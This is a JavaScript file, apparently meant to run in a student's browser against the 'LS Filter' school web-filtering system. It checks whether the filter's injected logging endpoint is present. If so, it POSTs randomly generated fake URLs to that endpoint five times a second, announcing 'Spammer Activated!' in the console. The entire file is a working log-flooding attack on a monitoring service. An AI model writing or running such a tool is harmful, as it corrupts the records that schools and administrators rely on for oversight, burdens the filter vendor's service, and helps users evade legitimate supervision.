const injectScriptUrl = '/772ff609488b2c9bb6bb2871cac430715c14f39e1462bea30062462d694cfd9a/log'
function getRandomItem(arr) {
   const randomIndex = Math.floor(Math.random() * arr.length);
   const item = arr[randomIndex];
   return item;
}
const array = ['com', 'net', 'ml', 'org', 'education', 'edu', 'lol', 'one', 'google', 'homes', 'art', 'biz', 'tk', 'cf', 'cl', 'es', 'cn', 'ru', 'au', 'uk', 'co.uk', 'com.es', 'news', 'com.au', 'bz', 'gl', 'le', 'me', 'cloud', 'skincare', 'academy', 'actor', 'active', 'eu', 'co.eu', 'ads', 'aero', 'africa', 'amazon', 'agency', 'app', 'apple', 'archi', 'army', 'gov', 'arte', 'auction', 'audio', 'audible', 'aws', 'autos', 'baby', 'band', 'bank', 'bar', 'barefoot', 'bargains', 'beauty', 'best', 'bet', 'bike', 'bio', 'bingo', 'black', 'blackfriday', 'blog', 'boo', 'book', 'boots', 'ca', 'io', 'de', 'fr', 'it', 'nl', 'jp', 'kr', 'se', 'no', 'fi', 'dk', 'pl', 'pt', 'ch', 'es', 'br', 'mx', 'in', 'ar', 'za', 'nz', 'at', 'be', 'co', 'cz', 'gr', 'hu', 'ie', 'ro', 'ru', 'tr', 'ua', 'ae', 'co.il', 'co.za', 'sa', 'sg', 'hk', 'my', 'tw', 'th', 'vn', 'ph', 'id', 'tr', 'co.jp', 'co.kr', 'com.tr', 'com.au', 'com.br', 'co.nz', 'com.mx', 'co.in', 'io', 'app', 'club', 'design', 'dev', 'events', 'family', 'fashion', 'fitness', 'guru', 'life', 'marketing', 'music', 'photos', 'social', 'store', 'tech', 'travel', 'video', 'website', 'work', 'xyz'];

 

 


const coolWords = [
  "awesome",
  "fantastic",
  "amazing",
  "stellar",
  "rad",
  "epic",
  "groovy",
  "chill",
  "slick",
  "swanky",
  "dope",
  "hip",
  "trendy",
  "stylish",
  "funky",
  "excellent",
  "superb",
  "outstanding",
  "fabulous",
  "phenomenal",
  "lucid",
  "vibrant",
  "dynamic",
  "extraordinary",
  "innovative",
  "sleek",
  "captivating",
  "electrifying",
  "welcoming",
  "inclusive",
  "friendly",
  "cheerful",
  "colorful",
  "engaging",
  "inspiring",
  "empowering",
  "uplifting",
  "positive",
  "energetic",
  "radiant",
  "inviting",
  "heartwarming",
  "encouraging",
  "supportive",
  "celebratory",
  "joyful",
  "spirited",
  "culturally diverse",
  "multicultural",
  "international",
  "global",
  "cosmopolitan",
  "open-minded",
  "harmonious",
  "interconnected",
  "resilient",
  "progressive",
  "inclusive",
  "celebratory",
  "compassionate",
  "tolerant",
  "respectful",
  "empathetic",
  "welcoming",
  "embracing",
  "dynamic",
  "vibrant",
  "collaborative",
  "creative",
  "curious",
  "adventurous",
  "exploratory",
  "insightful",
  "thoughtful",
  "knowledgeable",
  "inspiring",
  "motivating",
  "transformative",
  "ambitious",
  "aspirational",
  "fulfilling",
  "enriching",
  "mind-expanding",
  "academic",
  "educational",
  "enlightening",
  "informative",
  "fun-tastic",
  "happy-go-lucky",
  "jolly",
  "laugh-out-loud",
  "bubbly",
  "wacky",
  "whimsical",
  "quirky",
  "playful",
  "lively",
  "joyous",
  "smile-inducing",
  "giggly",
  "zany",
  "merry",
  "gleeful",
  "goofy",
  "carefree",
  "humorous",
  "hilarious",
  "comic",
  "silly",
  "entertaining",
  "enjoyable",
  "upbeat",
  "light-hearted"
];
const educationalWords = [
  "math",
  "school",
  "education",
  "science",
  "history",
  "learning",
  "knowledge",
  "classroom",
  "students",
  "books",
  "teacher",
  "study",
  "academic",
  "curriculum",
  "exams",
  "homework",
  "lecture",
  "research",
  "library",
  "graduation",
  "college",
  "university",
  "algebra",
  "geometry",
  "biology",
  "chemistry",
  "physics",
  "literature",
  "geography",
  "art",
  "music",
  "computer",
  "technology",
  "programming",
  "robotics",
  "astronomy",
  "language",
  "psychology",
  "sociology",
  "economics",
  "politics",
  "philosophy",
  "calculus",
  "statistics",
  "environmental",
  "anthropology",
  "archaeology",
  "health",
  "nutrition",
  "physical",
  "engineering",
  "design",
  "business",
  "communication",
  "media",
  "journalism",
  "social",
  "government",
  "ethics",
  "critical",
  "problemsolving",
  "creativity",
  "teamwork",
  "leadership",
  "debate",
  "speech",
  "drama",
  "theater",
  "fine",
  "civics",
  "vocabulary",
  "literacy",
  "grammar",
  "writing",
  "reading",
  "mathematics",
  "logic",
  "experiment",
  "scientific",
  "inquiry",
  "geology",
  "oceanography"
];

 

const time = '5'
const method = 'POST'
let p = 0;

 

 

 

 

function generate() {

 

 

 

 

 

 

  const xhr = new XMLHttpRequest();

 

 

 

 

 

 

  xhr.open(method, document.location.origin + injectScriptUrl, true);
const body = {
       url: "https://" + getRandomItem(coolWords) + getRandomItem(educationalWords) + "." + getRandomItem(array) + '/' + Math.random().toString(36).substring(2, 20)
   };

 

 

 

 


  console.log('Attempted try ' + p);

 

 

 

 

 

 

  p++;

 

 

 

 

 

 

  xhr.send(JSON.stringify(body));
}
const scriptExistsRequest = new XMLHttpRequest();
scriptExistsRequest.open('GET', injectScriptUrl);
scriptExistsRequest.onreadystatechange = function() {
  if (scriptExistsRequest.readyState === 4) {

 

 

 

 

 

 

   if (scriptExistsRequest.status === 200) {

 

 

 

 

 

 

     let t = parseInt(time);

 

 

 

 

 

 

     if (Number.isInteger(t)) {

 

 

 

 

 

 

       t = 1000 / t;

 

 

 

 

 

 

       setInterval(generate, t);

 

 

 

 

 

 

       console.log('[LS Filter] Spammer Activated!');

 

 

 

 

 

 

     } else {

 

 

 

 

 



 

 

 

 

 

 

     }

 

 

 

 

 

 

   } else if (scriptExistsRequest.status === 404) {

 

 

 

 

 

 

 console.log('[LS Filter]: Not Detected! ')

 

 

 

 

   }

 

 

 

 

 

 

  }
};
scriptExistsRequest.send();